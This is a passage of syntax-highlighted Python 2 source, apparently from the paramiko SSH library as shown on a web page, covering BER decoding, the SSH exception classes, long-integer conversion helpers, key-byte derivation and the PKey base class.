len(self.content):</span><br><span class="line">                t = ord(self.content[self.idx])</span><br><span class="line">                self.idx += <span class="number">1</span></span><br><span class="line">                ident = (ident &lt;&lt; <span class="number">7</span>) | (t &amp; <span class="number">0x7f</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> (t &amp; <span class="number">0x80</span>):</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> self.idx &gt;= len(self.content):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="comment"># now fetch length</span></span><br><span class="line">        size = ord(self.content[self.idx])</span><br><span class="line">        self.idx += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> size &amp; <span class="number">0x80</span>:</span><br><span class="line">            <span class="comment"># more complimicated...</span></span><br><span class="line">            <span class="comment"># <span class="doctag">FIXME:</span> theoretically should handle indefinite-length (0x80)</span></span><br><span class="line">            t = size &amp; <span class="number">0x7f</span></span><br><span class="line">            <span class="keyword">if</span> self.idx + t &gt; len(self.content):</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">            size = inflate_long(self.content[self.idx: self.idx + t], <span class="literal">True</span>)</span><br><span class="line">            self.idx += t</span><br><span class="line">        <span class="keyword">if</span> self.idx + size &gt; len(self.content):</span><br><span class="line">            <span class="comment"># can&#x27;t fit</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        data = self.content[self.idx: self.idx + size]</span><br><span class="line">        self.idx += size</span><br><span class="line">        <span class="comment"># now switch on id</span></span><br><span class="line">        <span class="keyword">if</span> ident == <span class="number">0x30</span>:</span><br><span class="line">            <span class="comment"># sequence</span></span><br><span class="line">            <span class="keyword">return</span> self.decode_sequence(data)</span><br><span class="line">        <span class="keyword">elif</span> ident == <span class="number">2</span>:</span><br><span class="line">            <span class="comment"># int</span></span><br><span class="line">            <span class="keyword">return</span> inflate_long(data)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 1: boolean (00 false, otherwise true)</span></span><br><span class="line">            <span class="keyword">raise</span> BERException(<span class="string">&#x27;Unknown ber encoding type %d (robey is lazy)&#x27;</span> % ident)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decode_sequence</span>(<span class="params">data</span>):</span></span><br><span class="line">        out = []</span><br><span class="line">        b = BER(data)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            x = b.decode_next()</span><br><span class="line">            <span class="keyword">if</span> x <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            out.append(x)</span><br><span class="line">        <span class="keyword">return</span> out</span><br><span class="line">    decode_sequence = staticmethod(decode_sequence)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SSHException</span> (<span class="params">Exception</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Exception raised by failures in SSH2 protocol negotiation or logic errors.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AuthenticationException</span> (<span class="params">SSHException</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Exception raised when authentication failed for some reason.  It may be</span></span><br><span class="line"><span class="string">    possible to retry with different credentials.  (Other classes specify more</span></span><br><span class="line"><span class="string">    specific reasons.)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    @since: 1.6</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PasswordRequiredException</span> (<span class="params">AuthenticationException</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Exception raised when a password is needed to unlock a private key file.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BadAuthenticationType</span> (<span class="params">AuthenticationException</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Exception raised when an authentication type (like password) is used, but</span></span><br><span class="line"><span class="string">    the server isn&#x27;t allowing that type.  (It may only allow public-key, for</span></span><br><span class="line"><span class="string">    example.)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    @ivar allowed_types: list of allowed authentication types provided by the</span></span><br><span class="line"><span class="string">        server (possible values are: C&#123;&quot;none&quot;&#125;, C&#123;&quot;password&quot;&#125;, and</span></span><br><span class="line"><span class="string">        C&#123;&quot;publickey&quot;&#125;).</span></span><br><span class="line"><span class="string">    @type allowed_types: list</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    @since: 1.1</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    allowed_types = []</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, explanation, types</span>):</span></span><br><span class="line">        AuthenticationException.__init__(self, explanation)</span><br><span class="line">        self.allowed_types = types</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> SSHException.__str__(self) + <span class="string">&#x27; (allowed_types=%r)&#x27;</span> % self.allowed_types</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PartialAuthentication</span> (<span class="params">AuthenticationException</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    An internal exception thrown in the case of partial authentication.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    allowed_types = []</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, types</span>):</span></span><br><span class="line">        AuthenticationException.__init__(self, <span class="string">&#x27;partial authentication&#x27;</span>)</span><br><span class="line">        self.allowed_types = types</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ChannelException</span> (<span class="params">SSHException</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Exception raised when an attempt to open a new L&#123;Channel&#125; fails.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    @ivar code: the error code returned by the server</span></span><br><span class="line"><span class="string">    @type code: int</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    @since: 1.6</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, code, text</span>):</span></span><br><span class="line">        SSHException.__init__(self, text)</span><br><span class="line">        self.code = code</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BadHostKeyException</span> (<span class="params">SSHException</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    The host key given by the SSH server did not match what we were expecting.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    @ivar hostname: the hostname of the SSH server</span></span><br><span class="line"><span class="string">    @type hostname: str</span></span><br><span class="line"><span class="string">    @ivar key: the host key presented by the server</span></span><br><span class="line"><span class="string">    @type key: L&#123;PKey&#125;</span></span><br><span class="line"><span class="string">    @ivar expected_key: the host key expected</span></span><br><span class="line"><span class="string">    @type expected_key: L&#123;PKey&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    @since: 1.6</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, hostname, got_key, expected_key</span>):</span></span><br><span class="line">        SSHException.__init__(self, <span class="string">&#x27;Host key for server %s does not match!&#x27;</span> % hostname)</span><br><span class="line">        self.hostname = hostname</span><br><span class="line">        self.key = got_key</span><br><span class="line">        self.expected_key = expected_key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> hexlify, unhexlify</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inflate_long</span>(<span class="params">s, always_positive=False</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;turns a normalized byte string into a long-int</span></span><br><span class="line"><span class="string">    (adapted from Crypto.Util.number)&quot;&quot;&quot;</span></span><br><span class="line">    out = <span class="number">0</span></span><br><span class="line">    negative = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> always_positive <span class="keyword">and</span> (len(s) &gt; <span class="number">0</span>) <span class="keyword">and</span> (ord(s[<span class="number">0</span>]) &gt;= <span class="number">0x80</span>):</span><br><span class="line">        negative = <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> len(s) % <span class="number">4</span>:</span><br><span class="line">        filler = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> negative:</span><br><span class="line">            filler = <span class="string">&#x27;\xff&#x27;</span></span><br><span class="line">        s = filler * (<span class="number">4</span> - len(s) % <span class="number">4</span>) + s</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(s), <span class="number">4</span>):</span><br><span class="line">        out = (out &lt;&lt; <span class="number">32</span>) + struct.unpack(<span class="string">&#x27;&gt;I&#x27;</span>, s[i:i + <span class="number">4</span>])[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> negative:</span><br><span class="line">        out -= (<span class="number">1</span> &lt;&lt; (<span class="number">8</span> * len(s)))</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deflate_long</span>(<span class="params">n, add_sign_padding=True</span>):</span></span><br><span class="line">    <span class="string">&quot;turns a long-int into a normalized byte string (adapted from Crypto.Util.number)&quot;</span></span><br><span class="line">    <span class="comment"># after much testing, this algorithm was deemed to be the fastest</span></span><br><span class="line">    s = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    n = long(n)</span><br><span class="line">    <span class="keyword">while</span> (n != <span class="number">0</span>) <span class="keyword">and</span> (n != <span class="number">-1</span>):</span><br><span class="line">        s = struct.pack(<span class="string">&#x27;&gt;I&#x27;</span>, n &amp; <span class="number">0xffffffff</span>) + s</span><br><span class="line">        n = n &gt;&gt; <span class="number">32</span></span><br><span class="line">    <span class="comment"># strip off leading zeros, FFs</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> enumerate(s):</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">0</span>) <span class="keyword">and</span> (i[<span class="number">1</span>] != <span class="string">&#x27;\000&#x27;</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">-1</span>) <span class="keyword">and</span> (i[<span class="number">1</span>] != <span class="string">&#x27;\xff&#x27;</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># degenerate case, n was either 0 or -1</span></span><br><span class="line">        i = (<span class="number">0</span>,)</span><br><span class="line">        <span class="keyword">if</span> n == <span class="number">0</span>:</span><br><span class="line">            s = <span class="string">&#x27;\000&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            s = <span class="string">&#x27;\xff&#x27;</span></span><br><span class="line">    s = s[i[<span class="number">0</span>]:]</span><br><span class="line">    <span class="keyword">if</span> add_sign_padding:</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">0</span>) <span class="keyword">and</span> (ord(s[<span class="number">0</span>]) &gt;= <span class="number">0x80</span>):</span><br><span class="line">            s = <span class="string">&#x27;\x00&#x27;</span> + s</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">-1</span>) <span class="keyword">and</span> (ord(s[<span class="number">0</span>]) &lt; <span class="number">0x80</span>):</span><br><span class="line">            s = <span class="string">&#x27;\xff&#x27;</span> + s</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">format_binary_weird</span>(<span class="params">data</span>):</span></span><br><span class="line">    out = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> enumerate(data):</span><br><span class="line">        out += <span class="string">&#x27;%02X&#x27;</span> % ord(i[<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">if</span> i[<span class="number">0</span>] % <span class="number">2</span>:</span><br><span class="line">            out += <span class="string">&#x27; &#x27;</span></span><br><span class="line">        <span class="keyword">if</span> i[<span class="number">0</span>] % <span class="number">16</span> == <span class="number">15</span>:</span><br><span class="line">            out += <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">format_binary</span>(<span class="params">data, prefix=<span class="string">&#x27;&#x27;</span></span>):</span></span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    out = []</span><br><span class="line">    <span class="keyword">while</span> len(data) &gt; x + <span class="number">16</span>:</span><br><span class="line">        out.append(format_binary_line(data[x:x + <span class="number">16</span>]))</span><br><span class="line">        x += <span class="number">16</span></span><br><span class="line">    <span class="keyword">if</span> x &lt; len(data):</span><br><span class="line">        out.append(format_binary_line(data[x:]))</span><br><span class="line">    <span class="keyword">return</span> [prefix + y <span class="keyword">for</span> y <span class="keyword">in</span> out]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">format_binary_line</span>(<span class="params">data</span>):</span></span><br><span class="line">    left = <span class="string">&#x27; &#x27;</span>.join([<span class="string">&#x27;%02X&#x27;</span> % ord(c) <span class="keyword">for</span> c <span class="keyword">in</span> data])</span><br><span class="line">    right = <span class="string">&#x27;&#x27;</span>.join([(<span class="string">&#x27;.%c..&#x27;</span> % c)[(ord(c) + <span class="number">63</span>) // <span class="number">95</span>] <span class="keyword">for</span> c <span class="keyword">in</span> data])</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;%-50s %s&#x27;</span> % (left, right)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hexify</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hexlify(s).upper()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unhexify</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> unhexlify(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">safe_string</span>(<span class="params">s</span>):</span></span><br><span class="line">    out = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">if</span> (ord(c) &gt;= <span class="number">32</span>) <span class="keyword">and</span> (ord(c) &lt;= <span class="number">127</span>):</span><br><span class="line">            out += c</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            out += <span class="string">&#x27;%%%02X&#x27;</span> % ord(c)</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bit_length</span>(<span class="params">n</span>):</span></span><br><span class="line">    norm = deflate_long(n, <span class="number">0</span>)</span><br><span class="line">    hbyte = ord(norm[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">if</span> hbyte == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    bitlen = len(norm) * <span class="number">8</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> (hbyte &amp; <span class="number">0x80</span>):</span><br><span class="line">        hbyte &lt;&lt;= <span class="number">1</span></span><br><span class="line">        bitlen -= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> bitlen</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tb_strings</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(traceback.format_exception(*sys.exc_info())).split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_key_bytes</span>(<span class="params">hashclass, salt, key, nbytes</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Given a password, passphrase, or other human-source key, scramble it</span></span><br><span class="line"><span class="string">    through a secure hash into some keyworthy bytes.  This specific algorithm</span></span><br><span class="line"><span class="string">    is used for encrypting/decrypting private key files.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    @param hashclass: class from L&#123;Crypto.Hash&#125; that can be used as a secure</span></span><br><span class="line"><span class="string">        hashing function (like C&#123;MD5&#125; or C&#123;SHA&#125;).</span></span><br><span class="line"><span class="string">    @type hashclass: L&#123;Crypto.Hash&#125;</span></span><br><span class="line"><span class="string">    @param salt: data to salt the hash with.</span></span><br><span class="line"><span class="string">    @type salt: string</span></span><br><span class="line"><span class="string">    @param key: human-entered password or passphrase.</span></span><br><span class="line"><span class="string">    @type key: string</span></span><br><span class="line"><span class="string">    @param nbytes: number of bytes to generate.</span></span><br><span class="line"><span class="string">    @type nbytes: int</span></span><br><span class="line"><span class="string">    @return: key data</span></span><br><span class="line"><span class="string">    @rtype: string</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    keydata = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    digest = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> len(salt) &gt; <span class="number">8</span>:</span><br><span class="line">        salt = salt[:<span class="number">8</span>]</span><br><span class="line">    <span class="keyword">while</span> nbytes &gt; <span class="number">0</span>:</span><br><span class="line">        hash_obj = hashclass()</span><br><span class="line">        <span class="keyword">if</span> len(digest) &gt; <span class="number">0</span>:</span><br><span class="line">            hash_obj.update(digest)</span><br><span class="line">        hash_obj.update(key)</span><br><span class="line">        hash_obj.update(salt)</span><br><span class="line">        digest = hash_obj.digest()</span><br><span class="line">        size = min(nbytes, len(digest))</span><br><span class="line">        keydata += digest[:size]</span><br><span class="line">        nbytes -= size</span><br><span class="line">    <span class="keyword">return</span> keydata</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Common API for all public keys.</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PKey</span> (<span class="params">object</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Base class for public keys.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># known encryption types for private key files:</span></span><br><span class="line">    _CIPHER_TABLE = &#123;</span><br><span class="line">        <span class="string">&#x27;AES-128-CBC&#x27;</span>: &#123;<span class="string">&#x27;cipher&#x27;</span>: AES, <span class="string">&#x27;keysize&#x27;</span>: <span class="number">16</span>, <span class="string">&#x27;blocksize&#x27;</span>: <span class="number">16</span>, <span class="string">&#x27;mode&#x27;</span>: AES.MODE_CBC&#125;,</span><br><span class="line">        <span class="string">&#x27;DES-EDE3-CBC&#x27;</span>: &#123;<span class="string">&#x27;cipher&#x27;</span>: DES3, <span class="string">&#x27;keysize&#x27;</span>: <span class="number">24</span>, <span class="string">&#x27;blocksize&#x27;</span>: <span class="number">8</span>, <span class="string">&#x27;mode&#x27;</span>: DES3.MODE_CBC&#125;,</span><br><span class="line">        <span class="string">&#x27;AES-256-CBC&#x27;</span>: &#123;<span class="string">&#x27;cipher&#x27;</span>: AES, <span class="string">&#x27;keysize&#x27;</span>: <span class="number">32</span>, <span class="string">&#x27;blocksize&#x27;</span>: <span class="number">16</span>, <span class="string">&#x27;mode&#x27;</span>: AES.MODE_CBC&#125;,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, msg=None, data=None</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Create a new instance of this public key type.  If C&#123;msg&#125; is given,</span></span><br><span class="line"><span class="string">        the key&#x27;s public part(s) will be filled in from the message.  If</span></span><br><span class="line"><span class="string">        C&#123;data&#125; is given, the key&#x27;s public part(s) will be filled in from</span></span><br><span class="line"><span class="string">        the string.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        @param msg: an optional SSH L&#123;Message&#125; containing a public key of this</span></span><br><span class="line"><span class="string">        type.</span></span><br><span class="line"><span class="string">        @type msg: L&#123;Message&#125;</span></span><br><span class="line"><span class="string">        @param data: an optional string containing a public key of this type</span></span><br><span class="line"><span class="string">        @type data: str</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        @raise SSHException: if a key cannot be created from the C&#123;data&#125; or</span></span><br><span class="line"><span class="string">        C&#123;msg&#125; given, or no key was passed in.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Return a string of an SSH L&#123;Message&#125; made up of the public part(s) of</span></span><br><span class="line"><span class="string">        this key.  This string is suitable for passing to L&#123;__init__&#125; to</span></span><br><span class="line"><span class="string">        re-create the key object later.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        @return: string representation of an SSH key message.</span></span><br><span class="line"><span class="string">        @rtype: str</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__cmp__</span>(<span class="params">self, other</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Compare this key to another.  Returns 0 if this key is equivalent to</span></span><br><span class="line"><span class="string">        the given key, or non-0 if they are different.  Only the public parts</span></span><br><span class="line"><span class="string">        of the key are compared, so a public key will compare equal to its</span></span><br><span class="line"><span class="string">        corresponding private key.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        @param other: key to compare to.</span></span><br><span class="line"><span class="string">        @type other: L&#123;PKey&#125;</span></span><br><span class="line"><span class="string">        @return: 0 if the two keys are equivalent, non-0 otherwise.</span></span><br><span class="line"><span class="string">        @rtype: int</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        hs = hash(self)</span><br><span class="line">        ho = hash(other)</span><br><span class="line">        <span class="keyword">if</span> hs != ho:</span><br><span class="line">            <span class="keyword">return</span> cmp(hs, ho)</span><br><span class="line">        <span class="keyword">return</span> cmp(str(self), str(other))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_name</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Return the name of this private key implementation.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        @return: name of this private key type, in SSH terminology (for</span></span><br><span class="line"><span class="string">        example, C&#123;&quot;ssh-rsa&quot;&#125;).</span></span><br><span class="line"><span class="string">        @rtype: str</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_bits</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Return the number of significant bits in this key.  This is useful</span></span><br><span class="line"><span class="string">        for judging the relative security of a key.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        @return: bits in the key.</span></span><br><span class="line"><span class="string">        @rtype: int</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">can_sign</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Return C&#123;True&#125; if this key has the private part necessary for signing</span></span><br><span class="line"><span class="string">        data.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        @return: C&#123;True&#125; if this is a private key.</span></span><br><span class="line"><span class="string">        @rtype: bool</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_fingerprint</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Return an MD5 fingerprint of the public part of this key.  Nothing</span></span><br><span class="line"><span class="string">        secret is revealed.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        @return: a 16-byte string (binary) of the MD5 fingerprint, in SSH</span></span><br><span class="line"><span class="string">            format.</span></span><br><span class="line"><span class="string">        @rtype: str</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> MD5.new(str(self)).digest()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_base64</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Return a base64 string containing the public part of this key.  Nothing</span></span><br><span class="line"><span class="string">        secret is revealed.  This format is compatible with that used to store</span></span><br><span class="line"><span class="string">        public key files or recognized host keys.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        @return: a base64 string containing the public part of the key.</span></span><br><span class="line"><span class="string">        @rtype: str</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> base64.encodestring(str(self)).replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sign_ssh_data</span>(<span class="params">self, rng, data</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Sign a blob of data with this private key, and return a L&#123;Message&#125;</span></span><br><span class="line"><span class="string">        representing an SSH signature message.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        @param rng: a secure random number generator.</span></span><br><span class="line"><span class="string">        @type rng: L&#123;Crypto.Util.rng.RandomPool&#125;</span></span><br><span class="line"><span class="string">        @param data: the data to sign.</span></span><br><span class="line"><span class="string">        @type data: str</span></span><br><span class="line"><span class="string">        @return: an SSH signature message.</span></span><br><span class="line"><span class="string">        @rtype: L&#123;Message&#125;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">verify_ssh_sig</span>(<span class="params">self, data, msg</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Given a blob of data, and an SSH message representing a signature of</span></span><br><span class="line"><span class="string">        that data, verify that it was signed with this key.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        @param data: the data that was signed.</span></span><br><span class="line"><span class="string">        @type data: str</span></span><br><span class="line"><span class="string">        @param msg: an SSH signature message</span></span><br><span class="line"><span class="string">        @type msg: L&#123;Message&#125;</span></span><br><span class="line"><span class="string">        @return: C&#123;True&#125; if the signature verifies correctly; C&#123;False&#125;</span></span><br><span class="line"><span class="string">            otherwise.</span></span><br><span class="line"><span class="string">        @rtype: boolean</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">from_private_key_file</span>(<span class="params">cls, filename, password=None</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Create a key object by reading a private key file.  If the private</span></span><br><span class="line"><span class="string">        key is encrypted and C&#123;password&#125; is not C&#123;None&#125;, the given password</span></span><br><span class="line"><span class="string">        will be used to decrypt the key (otherwise L&#123;PasswordRequiredException&#125;</span></span><br><span class="line"><span class="string">        is thrown).  